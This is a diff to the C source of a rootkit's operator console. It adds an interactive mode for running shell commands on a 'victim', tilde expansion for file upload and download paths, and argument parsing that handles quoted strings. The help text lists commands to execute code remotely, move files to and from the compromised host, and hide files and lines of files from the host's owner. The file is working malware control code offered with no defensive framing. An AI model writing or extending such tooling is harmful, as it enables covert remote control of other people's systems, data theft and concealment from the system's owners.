@@ -8,6 +8,30 @@
 #define CMD_LINE_SIZE 1024
 
 /**
+ * @brief Expands a leading ~ to the HOME directory.
+ * @param path    Input path (may start with ~).
+ * @param out     Output buffer.
+ * @param outsz   Size of output buffer.
+ */
+static void expand_tilde(const char *path, char *out, size_t outsz)
+{
+    const char *home;
+
+    if (path[0] == '~')
+    {
+        home = getenv("HOME");
+        if (home)
+            snprintf(out, outsz, "%s%s", home, path + 1);
+        else
+            snprintf(out, outsz, "%s", path);
+    }
+    else
+    {
+        snprintf(out, outsz, "%s", path);
+    }
+}
+
+/**
  * @brief Reads an entire file into a heap-allocated buffer.
  * @param path  Path to the file.
  * @param len   Output: number of bytes read.
@@ -71,17 +95,27 @@ static void print_prompt(void)
 static void print_help(void)
 {
     printf("\n"
-           "  \033[1mAvailable commands:\033[0m\n"
-           "  exec <cmd>           Execute cmd on victim\n"
-           "  upload <local> <rem> Upload file to victim\n"
-           "  download <rem> <loc> Download file from victim\n"
-           "  hide_file <name>     Hide file/dir from ls\n"
-           "  unhide_file <name>   Unhide file/dir\n"
-           "  hide_line <f> <pat>  Hide lines matching pattern in file\n"
-           "  unhide_line <f><pat> Unhide lines\n"
-           "  ping                 Ping rootkit\n"
-           "  help                 Show this help\n"
-           "  exit                 Disconnect\n"
+           "  \033[1;33mCommands\033[0m\n"
+           "\n"
+           "  \033[1mExecution\033[0m\n"
+           "    exec [cmd]                    Run a command on victim (no args = interactive mode)\n"
+           "    ping                          Check rootkit is alive\n"
+           "\n"
+           "  \033[1mFile transfer\033[0m\n"
+           "    upload   <local> <remote>     Send a file to victim\n"
+           "    download <remote> <local>     Get a file from victim\n"
+           "\n"
+           "  \033[1mHiding\033[0m\n"
+           "    hide_file   <name>            Hide file/dir from ls\n"
+           "    unhide_file <name>            Restore hidden file/dir\n"
+           "    hide_line   <file> <pattern>  Hide lines matching pattern\n"
+           "    unhide_line <file> <pattern>  Restore hidden lines\n"
+           "\n"
+           "  \033[1mSession\033[0m\n"
+           "    help                          Show this help\n"
+           "    exit                          Disconnect and quit\n"
+           "\n"
+           "  Paths can be quoted: upload \"/my path/a.txt\" \"/remote/b.txt\"\n"
            "\n");
 }
 
@@ -106,20 +140,59 @@ static void dispatch_ping(client_t *c)
 /**
  * @brief Sends a shell command to execute on the victim and prints the output.
  * @param c     Connected client.
+ * @param cmd   Command string (may contain spaces).
+ */
+static void exec_remote(client_t *c, const char *cmd)
+{
+    uint8_t  op;
+    char    *resp    = NULL;
+    uint32_t resp_len = 0;
+
+    send_packet(c->fd, CMD_EXEC, cmd, strlen(cmd));
+    if (recv_packet(c->fd, &op, &resp, &resp_len) == 0)
+        printf("%.*s\n", (int)resp_len, resp ? resp : "");
+    free(resp);
+}
+
+/**
+ * @brief Interactive command loop: type commands, 'exit' to return to main menu.
+ * @param c  Connected client.
+ */
+static void exec_interactive_loop(client_t *c)
+{
+    char line[CMD_LINE_SIZE];
+
+    printf("\nEntering command mode (type 'exit' to return to main menu)\n");
+    while (1)
+    {
+        printf("\nexec > ");
+        fflush(stdout);
+        if (!fgets(line, sizeof(line), stdin))
+            break;
+        line[strcspn(line, "\n")] = '\0';
+        if (strlen(line) == 0)
+            continue;
+        if (strcmp(line, "exit") == 0)
+            break;
+        exec_remote(c, line);
+    }
+    printf("\nReturned to main menu\n");
+}
+
+/**
+ * @brief Handles 'exec' command: interactive mode if no args, single exec if args.
+ * @param c     Connected client.
  * @param args  Tokenized command line; args[1..] form the command.
  * @param argc  Number of tokens.
  */
 static void dispatch_exec(client_t *c, char **args, int argc)
 {
-    char     full[CMD_LINE_SIZE] = { 0 };
-    uint8_t  op;
-    char    *resp    = NULL;
-    uint32_t resp_len = 0;
-    int      i;
+    char full[CMD_LINE_SIZE] = { 0 };
+    int  i;
 
     if (argc < 2)
     {
-        printf("Usage: exec <command>\n");
+        exec_interactive_loop(c);
         return;
     }
     for (i = 1; i < argc; i++)
@@ -128,10 +201,7 @@ static void dispatch_exec(client_t *c, char **args, int argc)
         if (i < argc - 1)
             strncat(full, " ", sizeof(full) - strlen(full) - 1);
     }
-    send_packet(c->fd, CMD_EXEC, full, strlen(full));
-    if (recv_packet(c->fd, &op, &resp, &resp_len) == 0)
-        printf("%.*s\n", (int)resp_len, resp ? resp : "");
-    free(resp);
+    exec_remote(c, full);
 }
 
 /**
@@ -151,18 +221,24 @@ static void dispatch_upload(client_t *c, char **args, int argc)
     char    *resp    = NULL;
     uint32_t resp_len = 0;
 
+    char local_path[CMD_LINE_SIZE];
+    char remote_path[CMD_LINE_SIZE];
+
     if (argc < 3)
     {
         printf("Usage: upload <local_path> <remote_path>\n");
         return;
     }
-    file_data = read_file(args[1], &file_len);
+    expand_tilde(args[1], local_path, sizeof(local_path));
+    expand_tilde(args[2], remote_path, sizeof(remote_path));
+
+    file_data = read_file(local_path, &file_len);
     if (!file_data)
     {
-        printf("Cannot read local file: %s\n", args[1]);
+        printf("Cannot read local file: %s\n", local_path);
         return;
     }
-    path_len  = strlen(args[2]) + 1;
+    path_len  = strlen(remote_path) + 1;
     total_len = path_len + file_len;
     payload   = malloc(total_len);
     if (!payload)
@@ -170,7 +246,7 @@ static void dispatch_upload(client_t *c, char **args, int argc)
         free(file_data);
         return;
     }
-    memcpy(payload, args[2], path_len);
+    memcpy(payload, remote_path, path_len);
     memcpy(payload + path_len, file_data, file_len);
     free(file_data);
     send_packet(c->fd, CMD_UPLOAD, payload, total_len);
@@ -192,18 +268,24 @@ static void dispatch_download(client_t *c, char **args, int argc)
     char    *resp    = NULL;
     uint32_t resp_len = 0;
 
+    char local_path[CMD_LINE_SIZE];
+    char remote_path[CMD_LINE_SIZE];
+
     if (argc < 3)
     {
         printf("Usage: download <remote_path> <local_path>\n");
         return;
     }
-    send_packet(c->fd, CMD_DOWNLOAD, args[1], strlen(args[1]));
+    expand_tilde(args[1], remote_path, sizeof(remote_path));
+    expand_tilde(args[2], local_path, sizeof(local_path));
+
+    send_packet(c->fd, CMD_DOWNLOAD, remote_path, strlen(remote_path));
     if (recv_packet(c->fd, &op, &resp, &resp_len) == 0)
     {
         if (resp && strncmp(resp, "FAIL", 4) != 0)
         {
-            write_file(args[2], resp, resp_len);
-            printf("Downloaded %u bytes -> %s\n", resp_len, args[2]);
+            write_file(local_path, resp, resp_len);
+            printf("Downloaded %u bytes -> %s\n", resp_len, local_path);
         }
         else
         {
@@ -270,25 +352,43 @@ static void dispatch_hide_line(client_t *c, const char *cmd, char **args,
 }
 
 /**
- * @brief Tokenizes @p line into @p args and stores the token count in @p argc.
- * @param line  Input line (modified in place by strtok).
+ * @brief Tokenizes @p line into @p args, respecting double-quoted strings.
+ *        Quotes are stripped from the token. "a b" becomes one token: a b.
+ * @param line  Input line (modified in place).
  * @param args  Output array of token pointers.
  * @param argc  Output token count.
  * @return 1 if at least one token was found, 0 if the line was empty.
  */
 static int parse_args(char *line, char **args, int *argc)
 {
-    char *tok;
+    char *p;
 
     *argc = 0;
     line[strcspn(line, "\n")] = '\0';
-    if (strlen(line) == 0)
-        return 0;
-    tok = strtok(line, " ");
-    while (tok && *argc < MAX_ARGS)
+    p = line;
+    while (*p && *argc < MAX_ARGS)
     {
-        args[(*argc)++] = tok;
-        tok = strtok(NULL, " ");
+        while (*p == ' ')
+            p++;
+        if (*p == '\0')
+            break;
+        if (*p == '"')
+        {
+            p++;
+            args[(*argc)++] = p;
+            while (*p && *p != '"')
+                p++;
+            if (*p == '"')
+                *p++ = '\0';
+        }
+        else
+        {
+            args[(*argc)++] = p;
+            while (*p && *p != ' ')
+                p++;
+            if (*p == ' ')
+                *p++ = '\0';
+        }
     }
     return *argc > 0;
 }
@@ -329,10 +429,12 @@ static int dispatch(client_t *c, char *line)
  * @brief Runs the interactive command loop until the operator exits or the
  *        connection drops.
  * @param c  Connected and authenticated client.
+ * @return 0 if client disconnected normally, 1 if operator typed 'exit'.
  */
-void commands_loop(client_t *c)
+int commands_loop(client_t *c)
 {
     char line[CMD_LINE_SIZE];
+    int  exit_cmd = 0;
 
     print_help();
     while (c->connected && c->authed)
@@ -341,6 +443,10 @@ void commands_loop(client_t *c)
         if (!fgets(line, sizeof(line), stdin))
             break;
         if (dispatch(c, line) < 0)
+        {
+            exit_cmd = 1;
             break;
+        }
     }
+    return exit_cmd;
 }
